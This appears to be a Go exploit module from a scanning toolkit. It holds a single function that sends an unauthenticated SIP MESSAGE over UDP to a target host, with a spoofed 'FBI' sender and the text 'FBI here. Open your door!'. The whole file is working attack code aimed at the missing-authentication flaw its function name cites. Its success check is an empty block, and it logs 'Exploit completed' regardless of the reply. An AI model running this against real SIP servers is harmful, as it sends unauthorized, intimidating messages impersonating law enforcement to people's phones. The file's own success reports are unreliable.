package main

import (
	"fmt"
	"log"
	"net"
	"regexp"
	"strings"
	"time"
)

var (
	validateRex = regexp.MustCompile(`(?i)20\d\s*(?:OK|Accepted)`)
)

func cve2021x37624(host string, wr *csvWriter) {
	conn, err := net.DialTimeout("udp", strings.Split(host, "@")[1], 2*time.Second)
	if err != nil {
		log.Println(err.Error())
		return
	}
	defer conn.Close()

	localIP := conn.LocalAddr().String()
	var payload string
	payload += fmt.Sprintf("MESSAGE sip:%s SIP/2.0\r\n", host)
	payload += fmt.Sprintf("Via: SIP/2.0/UDP %s;rport;branch=z9hG4bK-%s\r\n", localIP, genRandStr(8))
	payload += fmt.Sprintf("From: \"FBI\" <sip:022-324-3000@%s>;tag=%s\r\n", strings.Split(host, "@")[1], genRandStr(8))
	payload += fmt.Sprintf("To: <sip:%s>\r\n", host)
	payload += "CSeq: 1 MESSAGE\r\n"
	payload += "Content-Type: text/plain\r\n"
	payload += fmt.Sprintf("Call-ID: %s\r\n", genRandStr(20))
	payload += fmt.Sprintf("Contact: <sip:022-324-3000@%s;transport=udp>\r\n", strings.Split(host, "@")[1])
	payload += "Max-Forwards: 70\r\n"
	payload += "Content-Length: 25\r\n"
	payload += "\r\n"
	payload += "FBI here. Open your door!"

	conn.SetDeadline(time.Now().Add(5 * time.Second))
	_, err = conn.Write([]byte(payload))
	if err != nil {
		log.Println(err.Error())
	}
	mbuff := make([]byte, 64)
	_, err = conn.Read(mbuff)
	if err != nil {
		log.Println(err.Error())
	}
	if validateRex.Match(mbuff) {

	}
	log.Printf("Exploit completed for CVE-2021-37624: %s", host)
}
